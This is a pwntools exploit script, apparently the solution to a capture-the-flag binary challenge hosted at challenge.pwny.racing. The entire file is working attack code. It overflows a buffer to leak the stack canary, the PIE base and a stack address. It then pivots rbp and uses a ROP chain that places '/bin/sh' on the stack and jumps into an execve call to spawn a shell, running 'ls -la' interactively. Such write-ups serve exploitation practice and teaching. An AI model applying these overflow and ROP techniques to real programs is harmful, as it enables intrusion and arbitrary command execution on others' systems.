from pwn import *

# context.log_level = 'debug'
context.update(arch='amd64', os='linux')

# r = process('./chall21')
r = remote('challenge.pwny.racing', 40021)
e = ELF('./chall21')

# gdb.attach(r)

# leak canary and pie base
r.sendlineafter('buffer: ', 'A'*73)
r.recvuntil('output: ')
leak = r.recvline().strip()[73:]
canary = u64(leak[:7].rjust(8, '\x00'))
init_leak = u64(leak[7:].ljust(8, '\x00'))

log.info('Canary: 0x{:x}'.format(canary))
log.info('init: 0x{:x}'.format(init_leak))

e.address = init_leak - 0xBD0
log.info('PIE base: 0x{:x}'.format(e.address))

# leak a stack address
r.sendlineafter('buffer: ', 'A'*104)
r.recvuntil('output: ')
stack = u64(r.recvline().strip()[104:110].ljust(8, '\x00'))

log.info('Stack address: 0x{:x}'.format(stack))


rbp_pivot = stack & 0xffffffffffffff00 # this is unstable, might have to run the exploit a few times
main_input = e.address + 0xAF1
win = e.address + 0x9AC
execv_rbp = e.address + 0x9EF
pop_rdi = e.address + 0xc33

# set rbp to known value, so the next input will be at a known location
rop = flat([
    canary,
    rbp_pivot,
    main_input
])

r.sendlineafter('buffer: ', 'A'*72 + rop)
# exit the loop and return
r.sendlineafter('buffer: ', '')

# write /bin/sh\x00 at known location together with a pointer to it.
# jump right before the parameter setup for the execv call with rbp set,
# so that it sets our prepared string up correctly.
# The instructions setup the registers like this:
# mov     [rbp-0x38], 0
# mov     rax, [rbp-0x30]
# lea     rdx, [rbp-0x38] ; envp
# lea     rcx, [rbp-0x30]
# mov     rsi, rcx        ; argv
# mov     rdi, rax        ; path
# call    _execve
string_address = rbp_pivot - 0x50 # the buffer address on the stack of main is at rbp-0x50
rop = flat([
    canary,
    string_address + 0x40, # new rbp during exev_rbp rop gadget execution.
                           # offset carefully chosen so values line up with above rbp-0x30 etc. instructions.
    execv_rbp
])
# prepare stack of main for gadget:
# "/bin/sh\0"
# 0                                  # used as space for "envp" rbp-0x38
# string_address                     # address to /bin/sh at rbp-0x30. nulls afterwards terminate the argv array.
# 0 padding until return canary
# ropchain
r.sendlineafter('buffer: ', '/bin/sh\x00' + p64(0) + p64(string_address) + '\x00'*48 + rop)
r.sendlineafter('buffer: ', '')

r.sendline('ls -la')

r.interactive()
